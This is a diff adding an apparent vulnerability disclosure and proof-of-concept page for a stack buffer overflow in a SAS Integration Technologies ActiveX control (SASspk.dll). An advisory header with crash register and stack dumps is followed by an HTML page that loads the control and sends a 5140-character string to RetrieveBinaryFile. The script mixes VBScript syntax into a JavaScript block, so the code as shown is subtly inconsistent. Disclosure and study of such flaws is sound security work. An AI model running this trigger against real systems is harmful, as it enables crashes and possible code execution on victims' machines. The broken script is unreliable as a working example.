@@ -1,0 +1,93 @@
+<!--
+
+SAS Integration Technologies Client 9.31_M1 (SASspk.dll) Stack-based Overflow
+
+
+Vendor: SAS Institute Inc.
+Product web page: http://www.sas.com
+Affected version: Deployment Manager 9.3.0.0 (Model 12.05, TS1M2)
+                  SAS Integration Technologies Client 9.31_M1
+
+Summary: SAS Integration Technologies provides you with software that
+enables you to build a secure client/server infrastructure on which to
+implement SAS distributed processing solutions. With SAS Integration
+Technologies, you can integrate SAS with other applications in your
+enterprise; provide proactive delivery of information from SAS throughout
+the enterprise; extend the capabilities of SAS to meet your organization's
+specific needs; and develop your own distributed applications that leverage
+the analytic and reporting powers of SAS. The SAS Deployment Manager is
+used for post-installation configuration tasks such as configuring some
+products, applying hot fixes, updating metadata, and uninstalling SAS
+software.
+
+Desc: The SASspk module (SASspk.dll) version 9.310.0.11307, has a
+function called 'RetrieveBinaryFile()' which has one parameter called
+'bstrFileName' which takes arguments as strings as defined in the
+function itself as ISPKBinaryFile from the SASPackageRetrieve library.
+Stack-based buffer overflow was discovered in one of the fuzzing
+processes that could allow arbitrary code execution by an attacker
+when exploiting the non-sanitized 'bstrFileName' parameter.
+
+
+======================================================================
+
+ArgDump:
+--------------------------------------------------
+EBP+8	007EA404 -> Uni: AAAAAAAAAAAAAAAAAAAAAAAAA
+EBP+12	0016EB30 -> 00000000
+EBP+16	00940E68 -> BAADF00D
+EBP+20	41414141
+EBP+24	41414141
+EBP+28	41414141
+
+
+Stack Dump:
+--------------------------------------------------
+1699E0 60 0E 94 00 00 00 00 00 01 00 00 00 60 0E 94 00  [`...........`...]
+1699F0 30 28 00 00 00 00 00 00 00 00 00 00 E4 EA 16 00  [................]
+169A00 33 DF 4D 00 04 A4 7E 00 30 EB 16 00 68 0E 94 00  [..M.........h...]
+169A10 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]
+169A20 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]
+
+======================================================================
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 EN (32/64bit)
+           Microsoft Windows 7 Enterprise EN (32/64bit)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2013-5142
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5142.php
+
+
+20.04.2013
+
+-->
+
+
+<html>
+<title>SAS Integration Technologies Client ActiveX Stack BoF 0-day</title>
+<body>
+<object id='smash' classid='clsid:DDF47362-6319-11D4-87C0-00C04F48BC53' />
+<script>
+
+function run()
+{
+	targetFile = "C:\Program Files\SASHome\x86\Integration Technologies\SASspk.dll"
+	prototype  = "Function RetrieveBinaryFile ( ByVal bstrFileName As String ) As ISPKBinaryFile"
+	memberName = "RetrieveBinaryFile"
+	progid     = "SASPackageRetrieve.SPKRetrieve"
+	argCount   = 1
+	arg1=String(5140, "A")
+	smash.RetrieveBinaryFile arg1
+}
+
+</script><center><br /><br />
+<input language=JavaScript onclick=run() type=button value="Test">
+</center>
+</body>
+</html>
